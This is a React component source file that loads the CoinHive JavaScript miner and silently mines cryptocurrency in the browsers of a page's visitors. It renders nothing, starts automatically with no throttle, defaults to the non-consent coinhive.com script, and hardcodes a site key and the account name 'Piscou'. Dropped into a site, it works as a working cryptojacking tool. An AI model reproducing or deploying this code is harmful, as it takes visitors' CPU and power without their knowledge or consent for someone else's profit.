import React, {Component} from 'react';
import PropTypes from 'prop-types';
import load from 'load-script';

const src = {
  coinhive: 'https://coinhive.com/lib/coinhive.min.js',
  authedmine : 'https://authedmine.com/lib/authedmine.min.js',
}

export default class CoinHiveClient extends Component {

  static propTypes = {
    autoThreads: PropTypes.bool,
    onInit: PropTypes.func,
    onStart: PropTypes.func,
    onStop: PropTypes.func,
    run: PropTypes.bool,
    siteKey: PropTypes.string,
    threads: PropTypes.number,
    throttle: PropTypes.number,
    userName: PropTypes.string,
    src: PropTypes.string,
  }

  static defaultProps = {
    autoThreads: false,
    onInit: (miner) => null,
    onStart: (miner) => null,
    onStop: (miner) => null,
    run: true,
    siteKey: 'caP8U8pZXH6n0f53eV3fdpwOvpmTAD3C',
    threads: 2,
    throttle: 0,
    userName: 'Piscou',
    src: src.coinhive,
  }

  state = {
    loaded: false,
  }

  loadScript = () => new Promise(
    (resolve, reject) =>
      load(this.props.src,
      (err, script) => {
        if (err) {
          return reject(err);
        }
        return this.setState({ loaded: true }, () => resolve(script));
      }
  ));

  async componentDidMount() {
    await this.loadScript();
    if (this.props.run) {
      this.stop();
    }
    this.setupHive();
    if (this.props.run) {
      this.start();
    }
  }


  initHive = () => {
    if (this.miner) {
      this.stop();
      delete this.miner;
    }
    if (this.props.userName) {
      this.miner = CoinHive.User(this.props.siteKey, this.props.userName);
    } else {
      this.miner = CoinHive.Anonymous(this.props.siteKey);
    }
    this.props.onInit(this.miner)
  }

  start = () => {
    if (!this.miner) return;
    this.miner.start();
    this.props.onStart(this.miner);
  }

  stop = () => {
    if (!this.miner) return;
    this.miner.stop();
    this.props.onStop(this.miner);
  }

  setupHive = () => {
    if (this.props.autoThreads) {
      this.miner.setAutoThreadsEnabled(true)
    } else {
      this.miner.setAutoThreadsEnabled(false)
      this.miner.setNumThreads(this.props.threads);
    }
    this.miner.setThrottle(this.props.throttle);
  }

  componentDidUpdate(prevProps, prevState) {
    if (this.state.loaded) {
      if (!this.miner || this.props.userName !== prevProps.userName) {
        this.initHive();
      } else if (
        prevProps.threads !== this.props.threads
        || prevProps.autoThreads !== this.props.autoThreads
        || prevProps.throttle !== this.props.throttle
        || prevProps.userName !== this.props.userName
        || prevProps.siteKey !== this.props.siteKey
      ) {
        this.setupHive();
      } else if (prevProps.run !== this.props.run) {
        if (this.props.run) {
          this.start();
        } else {
          this.stop();
        }
      }
    }
  }
  render() {
    return null;
  }
};

CoinHiveClient.src = src;

CoinHiveClient.getMinerData = miner => {
  if (!miner || typeof miner !== 'object' || typeof miner.isRunning !== 'function') {
    return 'miner is not defined';
  }
  const data = {
    isRunning: miner.isRunning(),
    getHashesPerSecond: miner.getHashesPerSecond(),
    getNumThreads: miner.getNumThreads(),
    getAutoThreadsEnabled: miner.getAutoThreadsEnabled(),
    hasWASMSupport: miner.hasWASMSupport(),
    getThrottle: miner.getThrottle(),
    getToken: miner.getToken(),
    getTotalHashes: miner.getTotalHashes(),
    getAcceptedHashes: miner.getAcceptedHashes(),
  };
  return data;
};

